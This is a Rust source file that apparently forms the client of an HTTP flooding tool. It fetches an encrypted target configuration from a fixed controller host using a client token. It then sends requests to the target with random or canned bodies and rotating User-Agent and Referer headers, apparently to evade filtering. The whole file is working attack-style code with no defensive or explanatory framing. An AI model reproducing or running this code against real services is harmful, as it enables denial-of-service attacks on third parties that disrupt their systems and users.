pub mod config;

use config::ControllerConfig;
use iblib::{connection::create_stream, constant::*, debug, response::Response, ternary, util::*};

pub fn fetch_controller_config() -> Result<ControllerConfig> {
  let headers = format!(
    "{method} {path} HTTP/1.1{crlf}Host: {host}:{port}{crlf}Accept: */*{crlf}x-client-token: {token}{body_separator}",
    method = CONF_METHOD,
    path = CONF_PATH,
    crlf = CRLF,
    host = CONF_HOST,
    port = CONF_PORT,
    body_separator = BODY_SEPARATOR,
    token = *TOKEN
  );

  let mut stream = create_stream(
    CONF_SSL.parse().unwrap(),
    CONF_HOST,
    CONF_PORT.parse().unwrap(),
  )?;

  stream.write_buf(headers.as_bytes())?;

  let res: Response = Response::from(stream.get_res()?);

  if res.body.is_empty() {
    return Err("Response body is empty".into());
  }

  let conf = parse_config(&res.decrypted_body());
  let conf = ControllerConfig::from(conf);

  debug!("Done fetching config {:?}.", conf);

  Ok(conf)
}

pub fn call(conf: &ControllerConfig) -> Result<Response> {
  let mut stream = create_stream(conf.ssl, &conf.host, conf.port)?;
  let body = get_body(conf);
  let headers = get_headers(conf, body.len());

  stream.write_buf(&headers)?;
  stream.write_buf(BODY_SEPARATOR.as_bytes())?;

  if body.len() as u32 > MAX_BUFFER_CHUNK_SIZE {
    for chunk in body.chunks(MAX_BUFFER_CHUNK_SIZE as usize) {
      stream.write_buf(&chunk)?;
    }
  } else {
    stream.write_buf(&body)?;
  }

  stream.write_buf(&[0; 1])?;

  debug!("Done calling {}.", conf.get_addr());

  return Ok(Response::from(stream.get_res()?));
}

pub fn get_body(conf: &ControllerConfig) -> Vec<u8> {
  ternary!(
    conf.raw_bodies.is_empty(),
    gen_random_bytes(conf.content_length as usize),
    get_random_item(&conf.raw_bodies).as_bytes().to_vec()
  )
}

pub fn get_headers(conf: &ControllerConfig, content_length: usize) -> Vec<u8> {
  if conf.raw_headers.is_empty() {
    let mut headers = vec![
      format!("{} {} HTTP/1.1", conf.method, conf.path),
      format!("Host: {}:{}", conf.host, conf.port),
      format!("Content-Length: {}", content_length),
      format!("Cache-Control: no-cache"),
      format!("Connection: keep-alive"),
    ];

    if !conf.user_agents.is_empty() {
      headers.push(format!(
        "User-Agent: {}",
        get_random_item(&conf.user_agents)
      ))
    }

    if !conf.referers.is_empty() {
      headers.push(format!("Referer: {}", get_random_item(&conf.referers)))
    }

    headers.join(CRLF).as_bytes().to_vec()
  } else {
    get_random_item(&conf.raw_headers).as_bytes().to_vec()
  }
}
